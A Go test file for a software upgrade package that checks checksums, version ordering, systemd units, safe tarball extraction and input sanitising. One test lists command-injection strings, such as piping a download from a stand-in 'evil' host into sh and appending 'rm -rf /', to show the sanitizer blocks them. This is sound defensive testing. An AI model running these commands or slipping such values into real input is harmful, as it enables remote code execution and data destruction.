package upgrade

import (
	"archive/tar"
	"compress/gzip"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestParseChecksums_DistPrefixAndLookup(t *testing.T) {
	// Real shape: `sha256sum dist/*.tar.gz` emits dist/-prefixed paths.
	in := strings.Repeat("a", 64) + "  dist/rune_linux_amd64.tar.gz\n" +
		strings.Repeat("b", 64) + "  dist/rune-cli_darwin_arm64.tar.gz\n"
	cs, err := ParseChecksums(strings.NewReader(in))
	if err != nil {
		t.Fatal(err)
	}
	d, err := cs.Digest("rune_linux_amd64.tar.gz")
	if err != nil || d != strings.Repeat("a", 64) {
		t.Fatalf("digest lookup through dist/ prefix failed: %q %v", d, err)
	}
	// A missing asset is a hard error, never a silent skip.
	if _, err := cs.Digest("rune_linux_arm64.tar.gz"); err == nil {
		t.Fatal("missing digest must error")
	}
}

func TestParseChecksums_RejectsMalformedAndEmpty(t *testing.T) {
	if _, err := ParseChecksums(strings.NewReader("nonsense\n")); err == nil {
		t.Fatal("malformed line must error")
	}
	if _, err := ParseChecksums(strings.NewReader("")); err == nil {
		t.Fatal("empty checksums must error")
	}
}

func TestCompareVersions_DevPrereleaseIsNumeric(t *testing.T) {
	// The whole reason for a semver library: dev.150 > dev.16.
	c, err := CompareVersions("v0.0.1-dev.150", "v0.0.1-dev.16")
	if err != nil || c != 1 {
		t.Fatalf("dev.150 vs dev.16 = %d, %v; want 1", c, err)
	}
	if _, err := ParseVersion("dev"); err == nil {
		t.Fatal("a from-source \"dev\" version must not parse")
	}
}

func TestFloor_SeedAdvanceAndFailClosed(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "version-floor")

	// Absent: pre-seeding state.
	v, err := ReadFloor(p)
	if err != nil || v != nil {
		t.Fatalf("absent floor: %v %v", v, err)
	}

	if err := WriteFloor(p, "v0.0.1-dev.150"); err != nil {
		t.Fatal(err)
	}
	v, err = ReadFloor(p)
	if err != nil || v.Original() != "v0.0.1-dev.150" {
		t.Fatalf("floor readback: %v %v", v, err)
	}

	// Present-but-unparseable fails closed, distinguishably.
	if err := os.WriteFile(p, []byte("garbage\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	var unparseable *ErrFloorUnparseable
	if _, err := ReadFloor(p); !errors.As(err, &unparseable) {
		t.Fatalf("corrupt floor must fail closed with ErrFloorUnparseable, got %v", err)
	}

	// The writer refuses to write what it can't read back.
	if err := WriteFloor(p, "not-a-version"); err == nil {
		t.Fatal("WriteFloor must refuse unparseable values")
	}
}

func TestManifestStale(t *testing.T) {
	m := &Manifest{Version: "v0.0.1-dev.150", StagedAt: time.Now().Add(-20 * time.Minute)}
	if !m.Stale(time.Now()) {
		t.Fatal("20-minute-old manifest must be stale (reboot must not replay old upgrades)")
	}
	m.StagedAt = time.Now()
	if m.Stale(time.Now()) {
		t.Fatal("fresh manifest must not be stale")
	}
}

func TestPreconditionReasonRoundTrip(t *testing.T) {
	e := &PreconditionError{Reason: ReasonUnitsMissing, Detail: "x"}
	// The slug must survive being wrapped into a gRPC status message.
	if got := PreconditionReason("rpc error: code = FailedPrecondition desc = " + e.Error()); got != ReasonUnitsMissing {
		t.Fatalf("reason round-trip: %q", got)
	}
	if PreconditionReason("no slug here") != "" {
		t.Fatal("absent slug must yield empty")
	}
}

func TestCheckUnits_Preconditions(t *testing.T) {
	dataDir := t.TempDir()
	unitDir := t.TempDir()
	s := &Stager{DataDir: dataDir, UnitDir: unitDir}

	err := s.checkUnits()
	var pe *PreconditionError
	if !errors.As(err, &pe) || pe.Reason != ReasonUnitsMissing {
		t.Fatalf("missing units: %v", err)
	}

	// Path unit watching the WRONG dir (data_dir moved after install)
	// must refuse — staging into an unwatched dir is a silent wedge.
	writeUnit := func(pathExists string) {
		os.WriteFile(filepath.Join(unitDir, UpgradePathUnit),
			[]byte("[Path]\nPathExists="+pathExists+"\n"), 0o644)
		os.WriteFile(filepath.Join(unitDir, UpgradeServiceUnit), []byte("[Service]\n"), 0o644)
	}
	writeUnit("/somewhere/else/ready")
	err = s.checkUnits()
	if !errors.As(err, &pe) || pe.Reason != ReasonUnitsMissing {
		t.Fatalf("mismatched watch dir: %v", err)
	}

	writeUnit(ReadyPath(dataDir))
	if err := s.checkUnits(); err != nil {
		t.Fatalf("correct units must pass: %v", err)
	}
}

func TestUntarBinaries_ExtractsOnlyWanted(t *testing.T) {
	dir := t.TempDir()
	tarball := filepath.Join(dir, "a.tgz")
	f, _ := os.Create(tarball)
	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)
	add := func(name, content string) {
		tw.WriteHeader(&tar.Header{Name: name, Mode: 0o755, Size: int64(len(content)), Typeflag: tar.TypeReg})
		tw.Write([]byte(content))
	}
	add("rune", "cli-bytes")
	add("../evil", "traversal")
	add("runed", "daemon-bytes")
	tw.Close()
	gz.Close()
	f.Close()

	outRune := filepath.Join(dir, "rune.out")
	outRuned := filepath.Join(dir, "runed.out")
	if err := untarBinaries(tarball, map[string]string{"rune": outRune, "runed": outRuned}); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(outRuned); string(b) != "daemon-bytes" {
		t.Fatalf("runed content: %q", b)
	}
	if _, err := os.Stat(filepath.Join(dir, "evil")); !os.IsNotExist(err) {
		t.Fatal("path traversal entry must not be written")
	}

	// A tarball missing a wanted binary is an error.
	if err := untarBinaries(tarball, map[string]string{"missing": filepath.Join(dir, "x")}); err == nil {
		t.Fatal("missing wanted entry must error")
	}
}

func TestParseUnitShow(t *testing.T) {
	out := "User=custom\nGroup=customgrp\n" +
		"ExecStart={ path=/opt/rune/runed ; argv[]=/opt/rune/runed --config /etc/rune/custom.toml ; ignore_errors=no }\n"
	vals := defaultUnitOptionsForTest()
	bin, cfg, _ := ParseUnitShow(out, &vals)
	if bin != "/opt/rune/runed" || cfg != "/etc/rune/custom.toml" {
		t.Fatalf("bin=%q cfg=%q", bin, cfg)
	}
	if vals.User != "custom" || vals.Group != "customgrp" {
		t.Fatalf("user/group: %+v", vals)
	}
	// Empty show output leaves defaults intact.
	vals2 := defaultUnitOptionsForTest()
	bin, cfg, _ = ParseUnitShow("User=\nGroup=\n", &vals2)
	if bin != "" || cfg != "" || vals2.User != vals2.Group {
		// user/group both default to "rune"
		t.Fatalf("empty show must not clobber: bin=%q cfg=%q %+v", bin, cfg, vals2)
	}
}

// The applier polls the address runed actually binds; runed resolves
// flag > env > runefile, so a unit that pins either must win over the file
// or a healthy upgrade gets rolled back.
func TestParseUnitShow_BindAddressOverrides(t *testing.T) {
	vals := defaultUnitOptionsForTest()
	_, _, addr := ParseUnitShow(
		"ExecStart={ path=/usr/local/bin/runed ; argv[]=/usr/local/bin/runed --grpc-addr 127.0.0.1:9999 ; ignore_errors=no }\n", &vals)
	if addr != "127.0.0.1:9999" {
		t.Fatalf("flag address: %q", addr)
	}

	vals = defaultUnitOptionsForTest()
	_, _, addr = ParseUnitShow(
		"Environment=RUNE_SERVER_GRPC_ADDRESS=0.0.0.0:9001 OTHER=x\nExecStart={ path=/usr/local/bin/runed ; argv[]=/usr/local/bin/runed }\n", &vals)
	if addr != "0.0.0.0:9001" {
		t.Fatalf("env address: %q", addr)
	}

	vals = defaultUnitOptionsForTest()
	if _, _, addr = ParseUnitShow("ExecStart={ path=/usr/local/bin/runed ; argv[]=/usr/local/bin/runed }\n", &vals); addr != "" {
		t.Fatalf("no override must yield empty, got %q", addr)
	}

	// Flag beats env, in either print order.
	for _, out := range []string{
		"Environment=RUNE_SERVER_GRPC_ADDRESS=0.0.0.0:9001\nExecStart={ path=/x ; argv[]=/x --grpc-addr 127.0.0.1:9999 }\n",
		"ExecStart={ path=/x ; argv[]=/x --grpc-addr 127.0.0.1:9999 }\nEnvironment=RUNE_SERVER_GRPC_ADDRESS=0.0.0.0:9001\n",
	} {
		vals = defaultUnitOptionsForTest()
		if _, _, addr = ParseUnitShow(out, &vals); addr != "127.0.0.1:9999" {
			t.Fatalf("flag must outrank env regardless of order: %q", addr)
		}
	}
}

// The staging path is interpolated into a command the CLI prints for the
// operator to run as root, and it arrives over a channel with no transport
// authentication — so anything that could turn one argument into two
// commands must yield "" and drop the flag from the remedy.
func TestDataDirFromMessage_RejectsInjection(t *testing.T) {
	const marker = "reason=units-missing: /etc/systemd/system/runed-upgrade.path watches /x, but this server stages to "
	// The invariant is not "returns empty" — truncating at the newline and
	// keeping a clean prefix is a fine outcome. It is that nothing which
	// could start a second command ever reaches the printed line.
	for _, bad := range []string{
		"/var/lib/rune/upgrade/ready\ncurl$IFS-sL$IFShttps://evil/x|sh\n#",
		"/var/lib/rune/upgrade/ready;curl evil|sh",
		"/var/lib/rune/upgrade/ready`id`",
		"/var/lib/rune/upgrade/ready$(id)",
		"/var/lib/rune/upgrade/ready|sh",
		"/var/lib/rune/upgrade/ready\x1b[2Kfake",
		// A control byte carrying no shell metacharacter still rewrites
		// the terminal, so the metacharacter guard alone is not enough.
		"/var/lib/rune/upgrade\x01/ready",
		"/var/lib/rune/upgrade\x7f/ready",
		"/var/lib/rune/upgrade/ready && rm -rf /",
	} {
		got := DataDirFromMessage(marker + bad)
		if got == "" {
			continue // refused outright, also fine
		}
		if !strings.HasPrefix(got, "/") || strings.ContainsAny(got, " \t\r\n\"'`$;&|<>()!#~*?") {
			t.Fatalf("unsafe value reached the remedy line: input %q -> %q", bad, got)
		}
		for _, r := range got {
			if r < 0x20 || r == 0x7f {
				t.Fatalf("control byte reached the remedy line: input %q -> %q", bad, got)
			}
		}
	}
	// A relative path is never a valid staging dir.
	if got := DataDirFromMessage(marker + "relative/path/ready"); got != "" {
		t.Fatalf("relative path must be refused, got %q", got)
	}
	// A plain absolute path is still extracted, minus the trigger file.
	// Both trailing components come off: the installers take --data-dir and
	// append "upgrade" themselves.
	if got := DataDirFromMessage(marker + "/mnt/data/upgrade/ready — reinstall the units"); got != "/mnt/data" {
		t.Fatalf("clean path: %q", got)
	}
	if got := DataDirFromMessage("no marker here"); got != "" {
		t.Fatalf("absent marker: %q", got)
	}
}

func TestSanitizeServerDetail(t *testing.T) {
	if got := SanitizeServerDetail("ok\x1b[2K\nmore\x07"); got != "ok[2Kmore" {
		t.Fatalf("control bytes must be stripped, got %q", got)
	}
}
